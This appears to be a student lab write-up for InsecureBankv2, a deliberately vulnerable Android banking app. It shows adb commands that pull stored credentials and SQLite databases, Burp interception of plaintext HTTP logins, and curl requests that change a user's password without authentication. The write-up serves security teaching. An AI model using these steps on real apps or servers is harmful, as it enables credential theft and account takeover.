# Tasks
This file contains tasks related to Android mobile reversing.

## Insecure data storage

### Exploiting local data storage

#### Task 1: Find and read the Android Shared Preferences
1. Find the package name

This requires root. With images that use Google APIs,
you may easily get root by entering the following command:
```
$ adb root
```

Without Google API, you may 

Another way, and how I chose to solve this, was using _su_
as in the following snippet:
```bash
Android-InsecureBankv2> adb shell
generic_x86:/ $ su
generic_x86:/ # pm list packages | grep <packagename>
```

2. Copy all preferences to your machine.

Often you would like to have files locally on your machine,
and not on the device you are reversing. To do this, you
need root on the device. However, using _su_ will not do the
magic for us now as that is just within the shell. With images 
that use Google APIs, you may use:
```bash
$ adb root
```

And then, you can use another _adb_ command to pull the file
to you local machine:
```bash
$ adb pull /data/data/<package_name>/shared_prefs/<preference_file>.xml
```

3. Does the file contain anything juicy?

Hellz yeah, it does!
```bash
Android-InsecureBankv2> cat .\mySharedPreferences.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="superSecurePassword">DTrW2VXjSoFdg0e61fHxJg==&#10;    </string>
    <string name="EncryptedUsername">ZGluZXNo&#13;&#10;    </string>
</map>
```

#### Task 2: 
1. Where are the database(s) for this application located?

`/data/data/com.android.insecurebankv2/databases`

2. Copy the database out of the device

`adb pull /data/data/com.android.insecurebankv2/databases .`

3. What type of database is this?

SQLite 3:
```bash
$ cd databases
$ file mydb
mydb: SQLite 3.x database, user version 1, last written using SQLite version 3019004
```

4. Dump the schema
```bash
$ sqlite3 mydb
SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE android_metadata (locale TEXT);
CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL);
CREATE TABLE sqlite_sequence(name,seq);
```

5. List all tables
```bash
sqlite> .tables
android_metadata  names
```

6. Dump all the tables
```bash
sqlite> .dump names
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL);
INSERT INTO names VALUES(1,'dinesh');
COMMIT;
sqlite> .dump android_metadata
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE android_metadata (locale TEXT);
INSERT INTO android_metadata VALUES('en_US');
COMMIT;
```


### Task 1
To solve all of the following tasks, Burp Suite was used to intercept all the
traffic coming from the Android emulator. To do this, first install Burp. Open
Burp and click the `Proxy` tab. Ensure that intercept is `on`. To make the app
use Burp as a proxy, go into settings in the emulator and click the `proxy` tab.
Enter the IP address of your computer and set the port to 8080, which is the
default port used by Burp. Traffic should now go through Burp.

What happens when you log in?
1. What protocol is used?
`HTTP`

2. Is it encrypted?
No. Only HTTP is used, not HTTPS.

3. Can you see any sensitive data?
Yes, username and password is sent in clear text.

4. Can you identify other API endpoints?
In the Transfer-menu:
* `/getaccounts` when you press `Get Accounts`
* `/dotransfer` when you press `Transfer`
In the main menu:
* `/changepassword` when you press `Change Password`

Forging requests
1. Can you change the password of `dinesh` without logging in first?
Yes, there is no validation on the server to see if you are already logged in.
We can simply send a POST request to `/changepassword` on the server with the
expected parameters.
From looking at intercepted requests in Burp, we know that the request looks
like this:

```
POST /changepassword HTTP/1.1
Content-Length: 48
Content-Type: application/x-www-form-urlencoded
Host: 192.168.1.105:8888
Connection: close
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

username=<username>&newpassword=<password>
```
The easiest way to send a forged request is to click Action -> Send to repeater
in Burp. This allows you to click on the `Repeater` tab, change the contents as
you want, and send the modified request.

You can also use curl like this:
```bash
$ curl -d "username=dinesh&newpassword=lol" http://192.168.1.105:8888/changepassword
{"message": "Change Password Successful"}
```
And then verify that we can still log in:
```bash
$ curl -d "username=dinesh&password=lol" http://192.168.1.105:8888/login
{"message": "Correct Credentials", "user": "dinesh"}
```


2. Any other requests you can forge?
We can forge all requests to the server, as there's no checks in place to make
sure that we are logged in. We could transfer money between two accounts, for
example!
